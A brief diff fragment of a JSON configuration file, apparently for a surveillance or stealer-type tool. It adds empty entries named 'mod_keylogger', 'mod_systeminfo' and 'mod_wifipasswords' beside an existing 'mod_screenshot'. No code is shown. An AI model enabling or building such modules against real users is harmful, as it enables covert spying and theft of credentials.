@@ -5,5 +5,8 @@
             "file_path": "/test.py"
         }
     },
-    "mod_screenshot": {}
+    "mod_screenshot": {},
+    "mod_keylogger": {},
+    "mod_systeminfo": {},
+    "mod_wifipasswords": {}
 }
